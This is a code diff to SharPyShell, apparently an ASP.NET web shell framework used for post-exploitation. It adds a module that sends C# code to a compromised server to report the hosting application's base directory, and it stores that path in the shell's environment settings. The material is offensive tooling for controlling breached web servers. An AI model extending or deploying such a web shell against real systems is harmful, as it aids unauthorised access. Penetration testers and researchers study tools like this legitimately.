@@ -94,6 +94,32 @@ class GetEnvDirectory(Module):
             random_name_directory = args[0] if args[0] != '' else 'sharpyshell'
         return self._runtime_code % random_name_directory
 
+class GetHostingDirectory(Module):
+    class GetHostingDirectoryException(ModuleException):
+        pass
+
+    _exception_class = GetHostingDirectoryException
+
+    _runtime_code = r"""
+                using System;using System.IO;using System.Diagnostics;using System.Text;
+                using System.Security.AccessControl;using System.Security.Principal;
+                
+                public class SharPyShell
+                {                    
+                    private string GetHostingDirectory(string randomName)
+                    {
+                        
+                        return System.AppDomain.CurrentDomain.BaseDirectory;
+                    }
+
+                    public byte[] ExecRuntime()
+                    {
+                        string output_func=GetHostingDirectory(@"%s");
+                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
+                        return(output_func_byte);
+                    }
+                }
+    """
 
 class ClearDirectories(Module):
     class ClearDirectoriesException(ModuleException):
@@ -161,6 +187,7 @@ class Environment:
     def __init__(self, password, channel_enc_mode, request_object):
         self.env_settings = {}
         self.temp_dir_obj = GetTempDirectory(password, channel_enc_mode, {}, request_object)
+        self.hosting_dir_obj = GetHostingDirectory(password, channel_enc_mode, {}, request_object)
         self.env_dir_obj = GetEnvDirectory(password, channel_enc_mode, {}, request_object)
         self.clear_dir_obj = ClearDirectories(password, channel_enc_mode, {}, request_object)
 
@@ -179,11 +206,13 @@ class Environment:
         env_settings = dict()
         env_settings['working_directory'] = temp_dir
         env_directory = self.env_dir_obj.run([random_name_dir])
+        hosting_directory = self.hosting_dir_obj.run([])
         if '{{{GetEnvDirectoryException}}}' in env_directory:
             env_directory = r'C:\Windows\Temp'
         else:
             env_directory = env_directory.strip()
         env_settings['env_directory'] = env_directory
+        env_settings['hosting_directory'] = hosting_directory
         return env_settings
 
     def clear_env(self, env_settings):
